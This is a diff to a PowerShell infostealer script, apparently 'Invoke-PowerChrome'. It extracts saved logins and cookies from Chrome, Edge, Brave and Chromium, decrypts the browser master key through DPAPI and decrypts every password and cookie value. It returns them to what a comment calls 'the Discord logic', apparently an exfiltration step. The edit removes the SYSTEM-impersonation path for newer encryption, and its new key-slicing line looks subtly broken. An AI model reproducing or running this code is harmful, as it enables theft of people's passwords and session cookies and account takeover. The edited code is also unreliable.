@@ -841,186 +841,67 @@ if (-not ($Browser)){
     # ------------------------------------------------------------------
     # COLLECT DATA
     # ------------------------------------------------------------------
-    
+   # ------------------------------------------------------------------
+    # 1. COLLECT BOTH LOGINS AND COOKIES
+    # ------------------------------------------------------------------
     Log "Running Collection..."
     $BrowserData = Get-ChromiumLoginBlobs -Browser $Browser
-    $CookieData  = Get-ChromiumCookieBlobs -Browser $Browser # CALL THE COOKIE WORKER
+    $CookieBlobs = Get-ChromiumCookieBlobs -Browser $Browser # This must be called!
 
-    if (-not $BrowserData -and -not $CookieData) {
-        Write-Output "[-] No browser data or cookies found for $($Browser.ToUpper())"
+    if (-not $BrowserData -and -not $CookieBlobs) {
+        Write-Output "[-] No data found for $($Browser.ToUpper())"
         return
     }
 
-    if ($Verbose) {
-        $BrowserData | Format-Table URL, Username, BlobHeader
-    }
     # ------------------------------------------------------------------
-    # LOCAL STATE RESOLUTION
+    # 2. LOCAL STATE RESOLUTION (Keep your existing switch)
     # ------------------------------------------------------------------
     switch ($Browser.ToLower()) {
-        "cft"       { $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome for Testing\User Data\Local State"     }
-        "chrome"    { $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"                 }
-        "edge"      { $LocalStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"                }
-        "brave"     { $LocalStatePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"   }
-        "chromium"  { $LocalStatePath = "$env:LOCALAPPDATA\Chromium\User Data\Local State"                      }
-        default     { Write-Output "[-] Unsupported browser name: $Browser"; return }
+        "cft"       { $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome for Testing\User Data\Local State" }
+        "chrome"    { $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" }
+        "edge"      { $LocalStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" }
+        "brave"     { $LocalStatePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" }
+        "chromium"  { $LocalStatePath = "$env:LOCALAPPDATA\Chromium\User Data\Local State" }
+        default     { return }
     }
 
     # ------------------------------------------------------------------
-    # DECRYPT MASTER KEYS
+    # 3. DECRYPT THE MASTER KEY (Once, for both)
     # ------------------------------------------------------------------
-    
     $MasterKey = $null
-
-    if ($BrowserData[0].BlobHeader -eq 'v10 (DPAPI user)') {
-        Log "Blob Type     : v10"
+    # We check the first available blob to see if it's v10
+    $CheckBlob = if ($BrowserData) { $BrowserData[0] } else { $CookieBlobs[0] }
+    
+    if ($CheckBlob.BlobHeader -eq 'v10 (DPAPI user)') {
         try {
             $LocalState = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
-            $EncKey     = [Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)
-            $EncKey     = $EncKey[5..($EncKey.Length - 1)]
-            $MasterKey  = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-            LogHex "[*] Master Key   " $MasterKey
-        }
-        catch { Write-Output "[-] Failed to decrypt v10 key: $($_.Exception.Message)"; return }
-    }
-
-    if ($BrowserData[0].BlobHeader -eq 'v20 (ABE)') {
-
-        $Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-        if (-not ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM" -or 
-                $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
-            return "[-] Administrative or SYSTEM rights are required to decrypt v20 blobs."
-        }
-        
-        $LocalState     = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
-        $AppBoundEnc    = [Convert]::FromBase64String($LocalState.os_crypt.app_bound_encrypted_key)
-        if ([Text.Encoding]::ASCII.GetString($AppBoundEnc[0..3]) -ne "APPB") {
-            Write-Output "[-] Not valid APPB header. Aborting."
-            return
-        }
-
-        $EncKeyBlob = $AppBoundEnc[4..($AppBoundEnc.Length - 1)]
-
-        Log "Attempting to Impersonate SYSTEM"
-        
-        Invoke-Impersonate > $null
-        Log "Successfully Impersonated System"
-        Log "Performing First DPAPI Unprotect as NT AUTHORITY\SYSTEM"
-
-        try {
-            $First = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKeyBlob, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-        }
-        catch {
-            Write-Output "[-] First Unprotect failed: $($_.Exception.Message)"
-            [Advapi32]::RevertToSelf()
-            return
-        }
-
-        [void][Advapi32]::RevertToSelf()
-
-        if (-not $First -or $First.Length -eq 0) {
-            Write-Output "[-] First decryption produced no data."
-            return
-        }
-
-        Log "Data Byte Length: $($First.Length)"
-
-        Log "Performing second DPAPI Unprotect as $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
-        try {
-            $Second     = [System.Security.Cryptography.ProtectedData]::Unprotect($First, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-            Log "Data Byte Length: $($Second.Length)"
-            $Parsed     = Parse-ChromeKeyBlob -BlobData $Second
-            $MasterKey  = Decrypt-ChromeKeyBlob -ParsedData $Parsed
-            
-            Log "Blob Type     : v20 (ABE)"
-            LogHex "[*] Master Key   " $MasterKey
-        }
-        catch { Write-Output "[-] Second Unprotect failed: $($_.Exception.Message)"; return }
+            $EncKey = [Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)[5..-1]
+            $MasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        } catch { Write-Output "[-] Key Decryption Failed"; return }
     }
 
     # ------------------------------------------------------------------
-    # DECRYPT LOGIN PASSWORDS
+    # 4. DECRYPT EVERYTHING
     # ------------------------------------------------------------------
-    
-    $LoginDataResults = @()
-    foreach ($Record in $BrowserData) {
-    [int]$BlockSize = 16
-    [int]$NonceSize = 12
-    $Raw = [Convert]::FromBase64String($Record.Base64EncryptedPassword)
-    if (-not $Raw -or $Raw.Length -lt ($NonceSize + $BlockSize + 3)) { continue }
-
-    $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
-    switch ($Header) {
-        'v10' { $Key = $MasterKey; $Offset = 3 }
-        'v20' { $Key = $MasterKey; $Offset = 3 }
-        default { continue }
+    $DecryptedLogins = @()
+    foreach ($Entry in $BrowserData) {
+        $Pass = Decrypt-ChromiumBlob -Base64Blob $Entry.Base64EncryptedPassword -MasterKey $MasterKey
+        $DecryptedLogins += [PSCustomObject]@{ URL = $Entry.URL; User = $Entry.Username; Pass = $Pass }
     }
 
-    try {
-        $Nonce      = $Raw[$Offset..($Offset + $NonceSize - 1)]
-        $Ciphertext = $Raw[($Offset + $NonceSize)..($Raw.Length - $BlockSize - 1)]
-        $Tag        = $Raw[($Raw.Length - $BlockSize)..($Raw.Length - 1)]
-
-        $Plain   = DecryptWithAesGcm -Key $Key -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
-        $Decoded = [Text.Encoding]::UTF8.GetString($Plain)
-
-        $LoginDataResults += [PSCustomObject]@{
-            Target   = $Record.URL
-            Username = $Record.Username
-            Password = $Decoded
-        }
+    $DecryptedCookies = @()
+    foreach ($C in $CookieBlobs) {
+        $Val = Decrypt-ChromiumBlob -Base64Blob $C.Base64EncryptedValue -MasterKey $MasterKey
+        $DecryptedCookies += [PSCustomObject]@{ Host = $C.Host; Name = $C.Name; Value = $Val }
     }
-    catch {
-        Write-Output "[-] AES-GCM decryption failed for $($Record.URL): $($_.Exception.Message)"
-    }
-}
 
     # ------------------------------------------------------------------
-    # DECRYPT COOKIES
+    # 5. RETURN THE HASHTABLE (What the Discord logic expects)
     # ------------------------------------------------------------------
-    Log "Collecting Cookies..."
-    $CookieData = Get-ChromiumCookieBlobs -Browser $Browser
-    $CookieResults = @()
-
-    if ($CookieData) {
-        foreach ($Record in $CookieData) {
-            [int]$BlockSize = 16
-            [int]$NonceSize = 12
-            $Raw = [Convert]::FromBase64String($Record.Base64EncryptedValue)
-            if (-not $Raw -or $Raw.Length -lt ($NonceSize + $BlockSize + 3)) { continue }
-
-            $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
-            switch ($Header) {
-                'v10' { $Key = $MasterKey; $Offset = 3 }
-                'v20' { $Key = $MasterKey; $Offset = 3 }
-                default { continue }
-            }
-
-            try {
-                $Nonce      = $Raw[$Offset..($Offset + $NonceSize - 1)]
-                $Ciphertext = $Raw[($Offset + $NonceSize)..($Raw.Length - $BlockSize - 1)]
-                $Tag        = $Raw[($Raw.Length - $BlockSize)..($Raw.Length - 1)]
-
-                $Plain   = DecryptWithAesGcm -Key $Key -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
-                $Decoded = [Text.Encoding]::UTF8.GetString($Plain)
-
-                $CookieResults += [PSCustomObject]@{
-                    Host  = $Record.Host
-                    Name  = $Record.Name
-                    Value = $Decoded
-                    Path  = $Record.Path
-                }
-            }
-            catch { }
-        }
-    }
-
-    # Return results as a hashtable to reliably extract at caller level
     return @{
-        Logins  = $LoginDataResults
-        Cookies = $CookieResults
+        Logins  = $DecryptedLogins
+        Cookies = $DecryptedCookies
     }
-
 }
 # 1. Trigger the function with a valid browser name (Chrome, Edge, or Chromium)
 $Output = Invoke-PowerChrome -Browser Chrome -HideBanner
